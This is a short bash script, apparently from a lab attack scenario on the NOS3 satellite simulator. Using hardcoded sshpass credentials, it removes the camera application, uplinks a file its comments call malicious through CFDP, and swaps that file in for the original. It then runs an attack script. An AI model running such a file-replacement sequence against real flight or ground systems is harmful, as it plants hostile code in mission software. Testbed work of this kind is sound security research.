#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

# arducam_Delete.so has been compiled on SAT1

# rm/cp/mv version
#/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "rm /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"
#/usr/bin/sshpass -p nos3123! scp arducam_Delete.so nos3@$IPSAT1:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Delete.so    # for more realistic attack use CFDP TC (not working with NOS3 v1.6.2)
#/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPSAT1 "mv /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Delete.so /home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam.so"

# FM / CFDP version 
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/FM_rm.json --port 6010" # remove arducam.so using FM
echo "1) remove CAM App arducam.so"
sleep 1
/usr/bin/sshpass -p nos3123! scp arducam_A1.so nos3@$IPMCS:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/arducam_Delete.so  # copy arducam_Delete.so in /cf of MCS
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/uplinkCFDP_A15.json --port 6010" # Request CFDP uplink of the malicious arducam_Delete.so
echo "2) load malicious CAM App"
sleep 3
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/FM_mv_A15.json --port 6010" # mv arducam_Delete.so to arducam.so using FM
echo "3) replace CAM App with malicious"
sleep 1


now="$(date +"%T")"
echo "$now : replaced cam .so with delete /cf .so"
#echo "current time : $now"

python3 Attack_A15.py

## NB: reset nominal version of .so after the attack !
